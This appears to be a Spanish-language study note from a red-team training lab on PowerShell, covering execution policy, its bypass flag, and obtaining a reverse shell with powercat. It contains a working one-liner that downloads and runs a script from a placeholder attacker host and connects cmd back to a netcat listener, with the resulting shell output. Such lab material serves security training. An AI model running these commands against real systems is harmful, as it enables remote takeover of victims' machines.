---
layout: apunte
title: "5. PowerShell - PSH"
---

PowerShell es un lenguaje de programación orientado a objetos ejecutado desde el Dynamic Language Runtime (DLR) en `.NET` con algunas excepciones por usos de legado.

Los red teamers confían en PowerShell para realizar varias actividades, incluyendo acceso inicial, enumeración de sistemas y muchas otras. Comenzaremos creando un script de PowerShell que imprima `Welcome to Weaponization Room!` de la siguiente manera:

```powershell
Write-Output "Welcome to the Weaponization Room!"
```

Guarda el archivo como `thm.ps1`. Con `Write-Output`, imprimimos el mensaje en la línea de comandos.

--------------------------------
<h2>Política de Ejecución</h2>
La política de ejecución de PowerShell es una opción de seguridad para proteger el sistema ante scripts maliciosos. Por defecto, Microsoft inhabilita ejecutar scripts de PowerShell. Esta política de ejecución está configurada como `Restricted`, lo que significa permitir comandos individuales pero no ejecutar scripts. Puedes consultar la configuración de PowerShell en Windows de la siguiente manera:

```powershell
Get-ExecutionPolicy
```

También puedes cambiarla así:

```powershell
Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
```

--------------------------------------------
<h2>Bypasseo de Política de Ejecución</h2>
Microsoft ofrece formas de deshabilitar esta restricción. Una de estas formas es darle un argumento al comando PowerShell para cambiar el ajuste deseado. Por ejemplo, podemos cambiarlo a `bypass` lo que significa que nada es bloqueado o restringido. Esto es útil ya que nos permite ejecutar nuestros scripts de PowerShell.

Para asegurarnos de que el archivo PS se ejecuta, necesitamos darle la opción `bypass` en el argumento de la siguiente forma:

```powershell
powershell -ex bypass -File thm.ps1
```

Ahora vamos a intentar obtener una reverse shell usando una de las herramientas escritas en PowerShell, la cual es `powercat`. En tu máquina, descárgala de GitHub y ejecuta un servidor web para entregar el payload.

```bash
user@machine$ git clone https://github.com/besimorhino/powercat.git
Cloning into 'powercat'...
remote: Enumerating objects: 239, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 239 (delta 0), reused 2 (delta 0), pack-reused 235
Receiving objects: 100% (239/239), 61.75 KiB | 424.00 KiB/s, done.
Resolving deltas: 100% (72/72), done.
```

Ahora necesitamos configurar el servidor web para servir `powercat.ps1`, que será descargado y ejecutado en la máquina Windows. Después cambia el directorio a `powercat` y comienza la escucha en el puerto que elijas. En nuestro caso, estaremos usando el puerto `8080`.

```bash
user@machine$ cd powercat
user@machine$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

En la máquina atacante tenemos que escuchar en el puerto `1337` usando `nc` para recibir la conexión de la víctima.

```bash
user@machine$ nc -lvp 1337
```

Ahora, desde la máquina víctima, descargamos el payload y lo ejecutamos usando PowerShell:

```powershell
C:\Users\thm\Desktop> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
```

Ahora que hemos ejecutado el comando de arriba, la máquina víctima descarga el payload `powercat.ps1` del servidor web y lo ejecuta localmente usando `cmd.exe` y manda la conexión de vuelta a la máquina atacante que está escuchando.

```bash
user@machine$ nc -lvp 1337  listening on [any] 1337 ...
10.10.12.53: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.12.53] 49804
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\thm>
```

